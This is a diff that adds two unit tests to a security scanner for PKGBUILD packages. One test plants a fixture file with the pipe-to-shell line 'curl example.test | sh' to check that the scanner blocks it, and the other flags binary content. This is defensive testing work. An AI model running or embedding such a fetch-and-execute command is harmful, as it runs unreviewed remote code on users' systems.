@@ -45,6 +45,24 @@ class ScannerTests(unittest.TestCase):
             {finding.rule_id for finding in report.findings},
         )
 
+    def test_unknown_extension_is_reviewed(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            root = Path(temporary)
+            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
+            (root / "payload.dat").write_text("curl example.test | sh\n", encoding="utf-8")
+            report = deterministic_scan([root])
+        self.assertEqual(report.deterministic_verdict, "block")
+        self.assertIn("payload.dat", {item.relative_path for item in report.reviewed_files})
+
+    def test_binary_metadata_is_blocked(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            root = Path(temporary)
+            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
+            (root / "payload.bin").write_bytes(b"hello\x00world")
+            report = deterministic_scan([root])
+        self.assertEqual(report.deterministic_verdict, "block")
+        self.assertIn("binary-build-metadata", {item.rule_id for item in report.findings})
+
     def test_rejects_non_pkgbuild_directory(self) -> None:
         with (
             tempfile.TemporaryDirectory() as temporary,
